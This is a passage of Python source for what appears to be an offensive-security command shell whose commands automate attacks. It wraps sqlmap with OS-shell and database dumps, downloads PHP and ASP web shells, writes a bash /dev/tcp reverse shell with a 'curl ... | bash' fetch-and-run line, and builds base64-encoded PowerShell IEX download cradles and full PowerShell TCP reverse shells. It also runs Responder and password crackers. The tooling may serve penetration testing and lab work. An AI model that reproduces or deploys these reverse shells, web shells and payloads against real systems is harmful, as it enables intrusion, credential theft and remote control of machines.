        3. To use the wizard mode, execute `sqlmap -wizard`.
        4. For URL-based testing, ensure `url` is assign and run sqlmap with the URL.

        Dependencies:
        - The `sqlmap` tool must be installed and accessible from the command line.
        - The request file specified in `req` should be located in the `sessions` directory.

        Examples:
            sqlmap req requests.txt id
            sqlmap req requests.txt id database_name
            sqlmap req requests.txt id database_name table_name
            sqlmap -wiz

        Note:
            - Ensure the request file exists and is readable before running sqlmap.
            - The URL must be assign for URL-based testing.
            - The wizard mode is useful for interactive configuration if you're unsure about the options.
        """

        url = self.params["url"]

        if line:
            parts = line.split(" ")
            if line.startswith("req"):
                print_msg("Nùmero de parametros: " + str(len(parts)))
                if len(parts) == 1:
                    arg1 = parts[0]
                    path = os.getcwd()
                    print_msg(path)
                    file = path + "/sessions/" + arg1
                    print_msg(file)
                    if not os.path.isfile(file) or not os.access(file, os.R_OK):
                        print_error(
                            f"El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                        )
                        return
                    ssl = input("    [!] Force ssl? (y/n) Deflault: y") or 'y'
                    if ssl == 'y':
                        param_ssl = ' --force-ssl '
                    else:
                        param_ssl = ''
                    shell = input("    [!] Force shell? (y/n) Deflault: y") or 'y'
                    if shell == 'y':
                        param_shell = ' --os-shell '
                    else:
                        param_shell = ''
                    command = f"sqlmap -r {file} --risk=3 --level=3 --batch {param_ssl} {param_shell}"
                    print_msg(command)
                    self.cmd(command)
                    return

                elif len(parts) == 2:
                    arg1 = parts[0]
                    arg2 = parts[1]
                    path = os.getcwd()
                    print_msg(path)
                    file = path + "/sessions/" + arg1
                    print_msg(file)
                    if not os.path.isfile(file) or not os.access(file, os.R_OK):
                        print_error(
                            f"El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                        )

                        return
                    print_msg(
                        f"Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch --dbs --threads 10 --time-sec 10"
                    )
                    self.cmd(
                        f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch --dbs --threads 10 --time-sec 10"
                    )
                if len(parts) == 3:
                    arg1 = parts[0]
                    arg2 = parts[1]
                    arg3 = parts[2]
                    path = os.getcwd()
                    print_msg(path)
                    file = path + "/sessions/" + arg1
                    print_msg(file)
                    if not os.path.isfile(file) or not os.access(file, os.R_OK):
                        print_error(
                            f"El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                        )

                        return
                    command = f"sqlmap -r {file} --dbms=mysql --technique=B -T {arg2} -D {arg3} --dump"
                    command2 = f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch -D {arg3} --tables --dump --threads 3"
                    print_msg(f" 1) {command}")
                    print_msg(f" 2) {command2}")
                    choice = input("    [?] choice the attack 1 or 2:")
                    if choice == "1":
                        print_msg(f"Try... {command}")
                        self.cmd(command)
                    elif choice == '2':
                        print_msg(f"Try... {command2}")
                        self.cmd(command2)

            if len(parts) == 4:
                arg1 = parts[0]
                arg2 = parts[1]
                arg3 = parts[2]
                arg4 = parts[3]
                path = os.getcwd()
                print_msg(path)
                file = path + "/sessions/" + arg1
                print_msg(file)
                if not os.path.isfile(file) or not os.access(file, os.R_OK):
                    print_error(
                        f"El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                    )

                    return
                print_msg(
                    f"Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch -D {arg3} -T {arg4} --dump --threads 10"
                )
                self.cmd(
                    f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch -D {arg3} -T {arg4} --dump --threads 3"
                )
            elif line.startswith("-wiz"):
                print_msg("Try... sqlmap --wizard")
                self.cmd("sqlmap -wizard")
        else:
            if not url:
                print_error(
                    "url must be assign, ex: (assign url http://url.com), see <help assign> or <help sqlmap> to more info..."
                )
            return

            print_msg(f"Try... sqlmap -u {url} --os-shell --forms --crawl=2")
            self.cmd(f"sqlmap -u {url} --os-shell --forms --crawl=2")
        return

    @cmd2.with_category(recon_category)
    def do_proxy(self, line):
        """
        Runs a small proxy server to modify HTTP requests on the fly.

        This function starts the `lazyproxy.py` script, which acts as a proxy server for intercepting and modifying HTTP requests. The server listens on port 8888.

        Usage:
            proxy

        :param line: This parameter is not used in the current implementation.
        :type line: str
        :returns: None

        Manual execution:
        1. Executes the `lazyproxy.py` script to start the proxy server.
        2. The proxy server will run and modify requests as configured in the script.

        Dependencies:
        - The `lazyproxy.py` script must be available in the `modules` directory.

        Example:
            proxy

        Note:
            - Ensure that the `lazyproxy.py` script is correctly configured before running.
            - The proxy server will be accessible at `http://localhost:8888`.
            - To stop the proxy server, terminate the running process manually.
        """


        print_msg("Ejecutando Lazy Proxy ...")
        self.cmd(f"python3 modules/lazyproxy.py")
        print_msg(
            f"{YELLOW} Shutdown proxy server at sessions in port {RED} 8888 {RESET}"
        )
        return

    @cmd2.with_category(persistence_category)
    def do_createwebshell(self, line):
        """
        Creates a web shell disguised as a `.jpg` file in the `sessions` directory.

        This function performs the following actions:
        1. Runs a Python script `lazycreate_webshell.py` to create a disguised web shell.
        2. Downloads a PHP web shell from a specified URL and saves it to the `sessions` directory.

        Usage:
            createwebshell

        :param line: This parameter is not used in the current implementation.
        :type line: str
        :returns: None

        Manual execution:
        1. Executes the `lazycreate_webshell.py` script to create a web shell disguised as a `.jpg` file.
        2. Downloads a PHP web shell from the GitHub repository and saves it to `sessions`.

        Dependencies:
        - `wget` must be installed for downloading the web shell.
        - The `lazycreate_webshell.py` script must be available in the `modules` directory.

        Example:
            createwebshell

        Note:
            - Ensure that the `lazycreate_webshell.py` script is correctly configured and accessible.
            - Verify the URL in the `wget` command to ensure it points to a valid and safe web shell.
        """
        path = os.getcwd()
        sessions = f"{path}/sessions"
        print_msg("Creando la shell disfrazada de jpg")
        self.cmd("python3 modules/lazycreate_webshell.py")
        self.cmd(
            "cd sessions && wget https://github.com/flozz/p0wny-shell/raw/master/shell.php"
        )
        wget2 = f"wget -P {sessions} https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp"
        print_msg(wget2)
        self.cmd(wget2)
        return

    @cmd2.with_category(persistence_category)
    def do_createrevshell(self, line):
        """
        Creates a bash reverse shell script in the `sessions` directory with the specified `lhost` and `lport` values.

        This function performs the following actions:
        1. Checks if `lhost` and `lport` are assign. If not, it prints an error message and exits.
        2. Creates a bash reverse shell script using the provided `lhost` and `lport` values.
        3. Saves the script to `sessions/revshell.sh`.
        4. Prints a message with the `curl` command to download and execute the reverse shell script.
        5. Copies the `curl` command to the clipboard.

        Usage:
            createrevshell

        :param line: This parameter is not used in the current implementation.
        :type line: str
        :returns: None

        Manual execution:
        1. Creates or overwrites the file `sessions/revshell.sh` with the bash reverse shell script.
        2. Displays the command to download and execute the script via `curl`.
        3. Copies the `curl` command to the clipboard for easy use.

        Dependencies:
        - Bash must be installed on the target system.
        - `xclip` must be installed for copying the command to the clipboard.

        Example:
            createrevshell

        Note:
            - Ensure that `lhost` and `lport` are assign before running this command.
            - The script will listen for incoming connections on the specified `lport` and connect back to `lhost`.
            - Adjust the `lhost` and `lport` as needed for your specific environment.
        """

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        path = os.getcwd()
        sessions = f"{path}/sessions"
        if not lport or not lhost:
            print_msg(
                f"lport and lhost must be assign use: assign lport 443 and assign lhost 10.10.10.10 or use command payload"
            )
            return

        revshell = f"""#!/bin/bash
        bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        """.replace("        ", "")
        print_msg(f"Try... echo '{revshell}' > sessions/revshell.sh ")
        self.cmd(f"echo '{revshell}' > sessions/revshell.sh ")
        os.system(f"echo 'curl http://{lhost}/revshell.sh|bash' | xclip -sel clip")
        print_msg(f"echo 'curl http://{lhost}/revshell.sh|bash' | xclip -sel clip")
        print_msg(f"curl -o /tmp/revshell.sh http://{lhost}/revshell.sh && /bin/bash /tmp/revshell.sh")
        file_rev = f"{path}/sessions/win/payload.ps1"
        file_rev_ses = f"{path}/sessions/payload.ps1"
        wget = f"wget -P {sessions} https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1"
        print_msg(wget)
        self.cmd(wget)
        edit = f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> {sessions}/Invoke-PowerShellTcp.ps1"
        print_msg(edit)
        self.cmd(edit)
        with open(file_rev, 'r') as f:
            rev_content = f.read()

        rev_content = rev_content.replace("{lhost}",lhost).replace("{lport}",str(lport))

        with open(file_rev_ses, 'w+') as f:
            f.write(rev_content)

        if not is_exist(file_rev_ses):
            print_error("Error: payload.ps1 file was not created.")
            return
        else:
            with open(file_rev_ses, 'r') as f:
                content = f.read()
                if not content.strip():
                    print_error("Error: payload.ps1 file is empty.")
                    return

        payload = "IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/payload.ps1')".replace("{lhost}",lhost)
        print_msg(payload)
        payload2 = "IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/Invoke-PowerShellTcp.ps1')".replace("{lhost}",lhost)
        print_msg(payload2)
        utf16_command = payload.encode('utf-16le')
        base64_command = base64.b64encode(utf16_command).decode('utf-8')
        payload = base64_command
        utf16_command2 = payload2.encode('utf-16le')
        base64_command2 = base64.b64encode(utf16_command2).decode('utf-8')
        payload2 = base64_command2
        print_msg(f"Generated Windows payload: powershell /enc  {payload}")
        print_msg(f"Generated Windows payload: powershell /enc  {payload2}")
        return

    @cmd2.with_category(persistence_category)
    def do_createwinrevshell(self, line):
        """
        Creates a PowerShell reverse shell script in the `sessions` directory with the specified `lhost` and `lport` values.

        This function performs the following actions:
        1. Checks if `lhost` and `lport` are assign. If not, it prints an error message and exits.
        2. Creates a PowerShell reverse shell script using the provided `lhost` and `lport` values.
        3. Saves the script to `sessions/revshell.ps1`.
        4. Prints a message with the command to download and execute the reverse shell script via `curl`.
        5. Copies the `curl` command to the clipboard.

        Usage:
            createwinrevshell

        :param line: This parameter is not used in the current implementation.
        :type line: str
        :returns: None

        Manual execution:
        1. Creates or overwrites the file `sessions/revshell.ps1` with the PowerShell reverse shell script.
        2. Displays the command to download and execute the script via `curl`.
        3. Copies the `curl` command to the clipboard for easy use.

        Dependencies:
        - PowerShell must be installed on the target system.
        - `xclip` must be installed for copying the command to the clipboard.

        Example:
            createwinrevshell

        Note:
            - Ensure that `lhost` and `lport` are assign before running this command.
            - The script will listen for incoming connections on the specified `lport` and connect back to `lhost`.
            - Adjust the `lhost` and `lport` as needed for your specific environment.
        """

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        filename = "sessions/revshell.ps1"
        if not lport or not lhost:
            print_error(
                f"lport and lhost must be assign use: assign lport 443 and assign lhost 10.10.10.10 or use command payload"
            )
            return
        payload = (
            f"$X1=\"{lhost}\";$X2={lport};$X3=New-Object Net.Sockets.TCPClient($X1,$X2);"
            "$X4=$X3.GetStream();$Y1=New-Object IO.StreamReader($X4);$Y2=New-Object "
            "IO.StreamWriter($X4);$Y2.AutoFlush=$true;$Z1=New-Object Byte[] 1024;"
            "while($X3.Connected){while($X4.DataAvailable){$D1=$X4.Read($Z1,0,$Z1.Length);"
            "$J1=([Text.Encoding]::UTF8).GetString($Z1,0,$D1)}if($X3.Connected -and $J1.Length -gt 0){"
            "$D2=try{Invoke-Expression $J1 2>&1}catch{$_};$Y2.Write(\"$D2`n\");$J1=$null}};"
            "$X3.Close();$X4.Close();$Y1.Close();$Y2.Close()"
        )
        print_msg("\nAnother Payload:")
        print_msg(payload)
        with open('sessions/revshel2.ps1', "w") as f:
            f.write(payload)
        f.close()
        revshell = (
            """$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
        """.replace("{lhost}", lhost)
            .replace("{lport}", str(lport))
            .replace("        ", "")
        )

        print_msg(f"Try... echo '{revshell}' > sessions/revshell.ps1 \n")

        with open(filename, "w") as f:
            f.write(revshell)
        f.close()

        copy2clip(
            f"curl http://{lhost}/revshell.ps1 -o revshell.ps1 ; .\\\\revshell.ps1'"
        )

        return

    @cmd2.with_category(credential_access_category)
    def do_createhash(self, line):
        """
        Creates a `hash.txt` file in the `sessions` directory with the specified hash value and analyzes it using `Name-the-hash`.

        This function performs the following actions:
        1. Validates the input line to ensure it is not empty.
        2. Backs up the existing `hash.txt` file if it exists, renaming it to `hash_{timestamp}.txt` based on the current timestamp.
        3. Writes the provided hash value to `sessions/hash.txt`.
        4. Analyzes the hash value using `Name-the-hash`.

        Usage:
            createhash <hash>

        :param line: The hash value to be written to `hash.txt` and analyzed.
        :type line: str
        :returns: None

        Manual execution:
        1. Creates or overwrites the file `sessions/hash.txt` with the specified hash value.
        2. Analyzes the hash value using the `nth` command.

        Dependencies:
        - `sessions/hash.txt` will be created in the `sessions` directory.
        - `Name-the-hash` must be installed and accessible via the command `nth`.

        Example:
            createhash 5f4dcc3b5aa765d61d8327deb882cf99

        Note:
            - Ensure the hash value is correct before running the analysis.
            - The hash value should be provided as a single argument without extra characters or spaces.
        """

        if not line.strip():
            print_error("El valor del hash no puede estar vacío.")
            return

        print_msg(f"Creando archivo sessions/hash.txt con el siguiente contenido: {line}{RESET}")
        hash_file_path = 'sessions/hash.txt'
        if os.path.exists(hash_file_path):
            backup_file_path = f'sessions/hash_{int(time.time())}.txt'
            os.rename(hash_file_path, backup_file_path)
            print_msg(f"Archivo existente respaldado como {backup_file_path}{RESET}")

        with open(hash_file_path, 'w') as file:
            file.write(line + '\n')

        print_msg(f"Analizando sessions/hash.txt con Name-the-hash {RESET}")
        self.cmd(f"nth -t '{line}'")
        self.onecmd("create_session_json")

        return

    @cmd2.with_category(credential_access_category)
    def do_createcredentials(self, line):
        """
        Creates a `credentials.txt` file in the `sessions` directory with the specified username and password.

        This function performs the following actions:
        1. Validates the input line to ensure it contains a colon (`:`), indicating the presence of both a username and password.
        2. Backs up the existing `credentials.txt` file if it exists, renaming it to `credentials_{username}.txt` based on the existing username.
        3. Writes the valid input to `sessions/credentials.txt`.

        Usage:
            createcredentials user:password

        :param line: The input line containing the username and password in the format `user:password`.
        :type line: str
        :returns: None

        Manual execution:
        1. Creates or overwrites the file `sessions/credentials.txt` with the specified username and password.

        Dependencies:
        - `sessions/credentials.txt` will be created in the `sessions` directory.

        Example:
            createcredentials administrator:passwordadministrator123&!

        Note:
            - Ensure the input format is correct: `user:password`.
            - The credentials should be properly formatted with a colon separating the username and password.
        """

        print_msg(
            f"Creating file{GREEN} sessions/credentials.txt with content: {YELLOW}{line}{RESET}"
        )

        credentials_file_path = 'sessions/credentials.txt'
        if ":" in line:

            if os.path.exists(credentials_file_path):
                with open(credentials_file_path, 'r') as file:
                    existing_credentials = file.readline().strip()
                    existing_username = existing_credentials.split(":")[0]
                    backup_file_path = f'sessions/credentials_{existing_username}.txt'
                    os.rename(credentials_file_path, backup_file_path)
                    print_msg(f"Existent file saved: {backup_file_path}{RESET}")

            self.cmd(f"echo '{line}' > {credentials_file_path}")
        else:
            start_user = self.params["start_user"]
            start_pass = self.params["start_pass"]
            line = f"{start_user}:{start_pass}"
            if os.path.exists(credentials_file_path):
                with open(credentials_file_path, 'r') as file:
                    existing_credentials = file.readline().strip()
                    existing_username = existing_credentials.split(":")[0]
                    backup_file_path = f'sessions/credentials_{existing_username}.txt'
                    os.rename(credentials_file_path, backup_file_path)
                    print_msg(f"Existent file saved: {backup_file_path}{RESET}")
            self.cmd(f"echo '{line}' > {credentials_file_path}")
        self.onecmd("create_session_json")
        return

    @cmd2.with_category(exploitation_category)
    def do_createcookie(self, line):
        """
        Creates a `cookie.txt` file in the `sessions` directory with the specified cookie value.

        This function performs the following actions:
        1. Extracts the cookie value from the provided input line using a regular expression.
        2. Writes the extracted cookie value to `sessions/cookie.txt`.

        Usage:
            createcookie cookie=user_data=valor_base64

        :param line: The input line containing the cookie value in the format `cookie=value`.
        :type line: str
        :returns: None

        Manual execution:
        1. Creates or overwrites the file `sessions/cookie.txt` with the extracted cookie value.

        Dependencies:
        - `sessions/cookie.txt` will be created in the `sessions` directory.

        Example:
            createcookie cookie=user_data=valor_base64

        Note:
            - Ensure the input format is correct: `cookie=value`.
            - The cookie value should be properly encoded and formatted as needed.
        """

        print_msg(
            f"Creando archivo sessions/cookie.txt con el siguiente contenido {line}{RESET}"
        )

        match = re.search(r"cookie=([^&]+)", line)

        if match:
            cookie_value = match.group(1)
            self.cmd(f"echo '{cookie_value}' > sessions/cookie.txt")
            print_msg(f"Archivo creado con el contenido: {cookie_value}")
        else:
            print_error(
                f"El formato de entrada es incorrecto. Asegúrate de que el formato sea: cookie=user_data=valor_base64  {line}{RESET}"
            )
            return

    @cmd2.with_category(miscellaneous_category)
    def do_download_resources(self, line):
        """
        Downloads resources into the `sessions` directory.

        This function performs the following actions:
        1. Changes to the `sessions` directory and executes `download_resources.sh` to download required resources.

        Usage:
            download_resources

        :param line: Not used in this function.
        :type line: str
        :returns: None

        Manual execution:
        1. Runs the `download_resources.sh` script in the `sessions` directory to download necessary resources.

        Dependencies:
        - `download_resources.sh` must be present in the `sessions` directory.

        Example:
            download_resources

        Note:
            - Ensure that the `download_resources.sh` script is present in the `sessions` directory and is executable.
            - After running this command, you can use the `www` command as indicated by the printed message.
        """

        os.system("cd sessions && ./download_resources.sh ")
        print_msg(f"Resources downloaded now you can run command {MAGENTA}www {RESET}")
        return

    @cmd2.with_category(exploitation_category)
    def do_download_exploit(self, line):
        """
        Downloads and sets up exploits in the `external/.exploits/` directory and starts a web server to serve the files.

        This function performs the following actions:
        1. Changes to the `external` directory and executes `install_external.sh` to install necessary components or exploits.
        2. Displays the IP addresses associated with network interfaces and copies the IP address of `tun0` to the clipboard.
        3. Lists the contents of the `external/.exploit` directory and starts a web server on port 8443 to serve the files in that directory.
        4. Prints a message indicating the server's status and the port it's running on.

        Usage:
            download_exploit

        :param line: Not used in this function.
        :type line: str
        :returns: None

        Manual execution:
        1. Runs the `install_external.sh` script to assign up necessary components or exploits.
        2. Displays network interface IP addresses and copies the IP address of `tun0` to the clipboard.
        3. Lists the contents of `external/.exploit` directory.
        4. Starts a Python HTTP server on port 8443 in the `external/.exploit` directory to serve files.

        Dependencies:
        - `install_external.sh` must be present in the `external` directory.
        - `xclip` must be installed for clipboard operations.
        - Python 3 must be installed to run the HTTP server.

        Example:
            download_exploit

        Note:
            - Ensure that the `install_external.sh` script is correctly configured and present in the `external` directory.
            - The HTTP server will be accessible on port 8443.
            - The function assumes the presence of `external/.exploit` directory and serves files from there.
        """

        os.system("cd external && ./install_external.sh ")
        os.system(
            'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
        )
        os.system(
            "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip"
        )
        os.system(
            'echo "[\\e[96m`pwd`\\e[0m]\\e[34m" && cd external/.exploit && ls && echo -en "\\e[0m"'
        )
        print_msg(f"Web server at external/.exploit in port {RED} 8443 {RESET}")
        os.system("cd external/.exploit && python3 -m http.server 8443")
        print_msg(
            f"Shutdown Web server at external/.exploit in port {RED} 8443 {RESET}"
        )
        return

    @cmd2.with_category(scanning_category)
    def do_dirsearch(self, line):
        """
        Runs the `dirsearch` tool to perform directory and file enumeration on a specified URL.

        This function executes `dirsearch` to scan a given URL for directories and files, while excluding specific HTTP status codes from the results. If `dirsearch` is not installed, the function will attempt to install it before running the scan.

        Usage:
            dirsearch <url>

        :param line: Not used in this function. The URL is provided via the `url` parameter.
        :type line: str
        :returns: None

        Manual execution:
        1. If `dirsearch` is present, the command `dirsearch -u <url> -x 403,404,400` is executed.
        2. If `dirsearch` is not present, the function installs `dirsearch` using `sudo apt install dirsearch -y` and then runs the command.

        Dependencies:
        - `dirsearch` must be installed. If not present, it will be installed using `sudo apt`.
        - Ensure the URL is assign via the `url` parameter before calling this function.

        Example:
            dirsearch http://example.com/

        Note:
            - Ensure that the `url` parameter is assign before calling this function.
            - The `-x` option specifies HTTP status codes to exclude from the results (e.g., 403, 404, 400).
            - The function will attempt to install `dirsearch` if it is not already installed.
        """

        url = self.params["url"]
        if not url:
            print_error(
                "Url must be assign: use assign url http://url.ext/ more info in help assign"
            )
            return
        if is_binary_present("dirsearch"):
            print_msg("[*] Try... dirsearch -u http://url.ext/ -x 403,404,400")
            self.cmd(f"dirsearch -u {url} -x 403,404,400")
        else:
            print_error(
                "dirsearch is not installed, installing... (control + c to cancel)"
            )
            self.cmd(
                f"sudo apt install dirsearch -y && dirsearch -u {url} -x 403,404,400"
            )
        return

    @cmd2.with_category(credential_access_category)
    def do_john2hash(self, line):
        """
        Runs John the Ripper with a specified wordlist and options.

        This function executes John the Ripper to crack hashes using the specified wordlist and additional options. If no additional options are provided, it will attempt to display cracked hashes.

        Usage:
            john2hash <options>

        :param line: Optional arguments to be passed to John the Ripper (e.g., `--format=Raw-SHA512`). If not provided, the function will default to showing the cracked hashes.
        :type line: str
        :returns: None

        Manual execution:
        1. If `line` is provided, the command `sudo john sessions/hash.txt --wordlist=<wordlist> <options>` is executed.
        2. If `line` is not provided, the command `sudo john sessions/hash.txt --wordlist=<wordlist>` is executed to display the cracked hashes.

        Dependencies:
        - John the Ripper must be installed and available in the system's PATH.
        - Ensure the wordlist file exists at the specified path.
        - The `sessions/hash.txt` file must contain the hashes to be cracked.

        Example:
            john2hash --format=Raw-SHA512
            # If `wordlist` is assign to `/usr/share/wordlists/rockyou.txt`, the command executed will be `sudo john sessions/hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512`.

        Note:
            - Ensure that the `wordlist` parameter is set before calling this function.
            - Provide the necessary options as a string argument (e.g., `--format=Raw-SHA512`) if needed.
            - If no options are provided, the function defaults to showing the cracked hashes.
        """
        hashs = get_hash(True)
        wordlist = self.params["wordlist"]
        if not wordlist:
            print_error("wordlist must be assign use assign wordlist <path_to_wordlist>")
            return
        if line:
            command = f"sudo john {hashs} {line}"
            print_msg(command)
            self.cmd(command)
        else:
            print_msg(f"Try john {hashs} --wordlist={wordlist}")
            self.cmd(f"sudo john {hashs} --wordlist={wordlist}")
        return

    @cmd2.with_category(credential_access_category)
    def do_hashcat(self, line):
        """
        Runs Hashcat with specified attack mode and hash type using a wordlist.

        This function executes the Hashcat tool with the specified mode and wordlist file. The hash value to be cracked should be provided as an argument.

        Usage:
            hashcat <mode>

        :param line: The hash type or mode to be used with Hashcat (e.g., 0 for MD5). This is a required argument.
        :type line: str
        :returns: None

        Manual execution:
        1. The command `hashcat -a 0 -m <mode> <hash> <wordlist>` is executed, where `<mode>` is the hash type, `<hash>` is the hash to be cracked, and `<wordlist>` is the path to the wordlist file.

        Dependencies:
        - Hashcat must be installed and available in the system's PATH.
        - Ensure the wordlist file exists at the specified path.

        Example:
            hashcat 0
            # If `wordlist` is set to `/usr/share/wordlists/rockyou.txt` and `line` is `0`, the command executed will be `hashcat -a 0 -m 0 /usr/share/wordlists/rockyou.txt`.

        Note:
            - Ensure that the `wordlist` parameter is set before calling this function.
            - The hash to be cracked must be passed as an argument when calling the function.
            - Replace `<mode>` with the appropriate Hashcat mode number (e.g., `0` for MD5, `1000` for NTLM).
        """

        wordlist = self.params["wordlist"]
        if not wordlist or not line:
            print_error(
                "wordlist must be assign and you need pass the hash in argument ex: hashcat hash"
            )
            return
        choice = input("    [?] Do you wanna use this rule /usr/share/hashcat/rules/best64.rule (y/n): ") or 'n'
        if choice == 'n':
            print_msg(f"Try hashcat -a 0 -m {line} {wordlist}")
            self.cmd(f"hashcat -a 0 -m {line} {wordlist}")
        else:
            print_msg(f"Try hashcat -a 0 -m {line} {wordlist} -r /usr/share/hashcat/rules/best64.rule ")
            self.cmd(f"hashcat -a 0 -m {line} {wordlist} -r /usr/share/hashcat/rules/best64.rule ")
        return

    def complete_hashcat(self, text, line, begidx, endidx):
        """Complete mode options and file paths for the sessions/hash.txt"""
        parts = line.split()

        if len(parts) == 1:
            return [
                str(x) for x in range(0, 20000) if str(x).startswith(text)
            ]  # Modify the range as needed for mode options

        if len(parts) == 2:
            return [f for f in glob.glob("sessions/hash.txt") if f.startswith(text)]

        return []

    @cmd2.with_category(privilege_escalation_category)
    def do_responder(self, line):
        """
        Runs Responder on a specified network interface with elevated privileges.

        This function executes the Responder tool with `sudo` on the network interface provided in the `device` parameter.

        Usage:
            responder

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
        1. The command `sudo responder -I <device>` is executed, where `<device>` is the network interface specified by the user.

        Dependencies:
        - The function relies on `sudo` to run Responder with root privileges.
        - Ensure that Responder is installed and available in the system's PATH.

        Example:
            responder
            # If `device` is assign to `tun0`, the command executed will be `sudo responder -I tun0`.

        Note:
            - Ensure that the `device` parameter is set before calling this function.
            - Replace `<device>` with the appropriate network interface, such as `tun0`, `eth0`, etc.
            - Running Responder requires root privileges, so make sure the user running the command has the necessary permissions.
        """

        device = self.params["device"]
        if not device:
            print_error("Device must be assign use assign device <network_device_ex_tun0>")
            return
        if not is_binary_present("responder"):
            print_warn("Responder not found installing...")
            self.cmd("sudo apt install responder python-aioquic -y")
        print_msg(f"Try sudo responder -I {device} -w On ")
        self.cmd(f"sudo responder -I {device} -w On ")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_ip(self, line):
        """
        Displays IP addresses of network interfaces and copies the IP address from the `tun0` interface to the clipboard.

        This function performs the following tasks:
        1. Displays IP addresses for all network interfaces using `ip a show scope global` and `awk`.
        2. Copies the IP address from the `tun0` interface to the clipboard using `xclip`.

        Usage:
            ip

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
        1. The command `ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }'` is executed to display the IP addresses of all network interfaces.
        2. The IP address of the `tun0` interface is copied to the clipboard using the command `ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip`.

        Dependencies:
        - The function relies on `awk`, `grep`, `cut`, and `xclip` to process and copy the IP address.

        Example:
            ip
            # This will display IP addresses for all network interfaces and copy the IP address from `tun0` to the clipboard.

        Note:
            Ensure that the `tun0` interface exists and has an IP address assigned. If `tun0` is not present or has no IP address, the clipboard will not be updated.
        """

        os.system(
            'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
        )
        os.system(
            "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip"
        )

        try:
            clipboard_ip = subprocess.check_output('xclip -o -sel clip', shell=True).decode().strip()
        except subprocess.CalledProcessError:
            clipboard_ip = ""

        print_msg(f"IP from tun0 copied to clipboard :) {RESET}")
        lhost = self.params['lhost']
        if not check_lhost(lhost):
            return
        if clipboard_ip and clipboard_ip != self.params['lhost']:
            lhost = clipboard_ip
            self.onecmd(f"assign lhost {clipboard_ip}")
            self.custom_prompt = getprompt()

            print_msg(f"Updated lhost to {clipboard_ip}")
        return


    def do_ipp(self, line):
        """
        Displays IP addresses of network interfaces and prints the IP address from the `tun0` interface.

        This function performs the following tasks:
        1. Displays IP addresses for all network interfaces using `ip a show scope global` and `awk`.
        2. Prints the IP address from the `tun0` interface.

        Usage:
            ip

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
        1. The command `ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }'` is executed to display the IP addresses of all network interfaces.
        2. The IP address of the `tun0` interface is printed to the console using the command `ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1`.

        Dependencies:
        - The function relies on `awk`, `grep`, `cut`, and `xclip` to process and display the IP address.

        Example:
            ip
            # This will display IP addresses for all network interfaces and print the IP address from `tun0`.

        Note:
            Ensure that the `tun0` interface exists and has an IP address assigned. If `tun0` is not present or has no IP address, the address will not be displayed.
        """

        # Display IP addresses for all network interfaces
        os.system(
            'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
        )

        # Print the IP address of the `tun0` interface
        try:
            ip_address = subprocess.check_output(
                "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1",
                shell=True
            ).decode().strip()


        except subprocess.CalledProcessError:
            print_error("Error retrieving IP address from tun0.")

        # Optionally update lhost
        lhost = self.params['lhost']
        if ip_address and ip_address != lhost:
            lhost = ip_address
            # Example of how you might set the new lhost
            self.params['lhost'] = lhost

            print_msg(f"Updated lhost to {lhost}")

        return

    @cmd2.with_category(miscellaneous_category)
    def do_rhost(self, line):
        """
        Copies the remote host (rhost) to the clipboard and updates the command prompt.

        This function performs two tasks:
        1. It copies the `rhost` parameter to the clipboard if it is valid.
        2. It updates the command prompt to include the `rhost` and the current working directory.

        Usage:
            rhost [clean]

        :param line: An optional argument that determines the behavior of the function:
